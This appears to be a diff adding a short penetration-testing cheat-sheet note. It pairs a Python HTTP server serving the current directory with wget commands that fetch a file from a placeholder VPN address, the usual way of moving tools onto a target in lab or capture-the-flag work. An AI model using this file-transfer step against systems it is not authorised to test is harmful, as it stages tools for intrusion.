@@ -1,0 +1,9 @@
+
+
+	python3  -m http.server 80  -d $(pwd)
+::: wget http://ip_VPN_here/file_Here
+
+
+
+	python3  -m http.server Port_Here  -d $(pwd)
+::: wget http://ip_VPN_here:Port_Here/file_Here
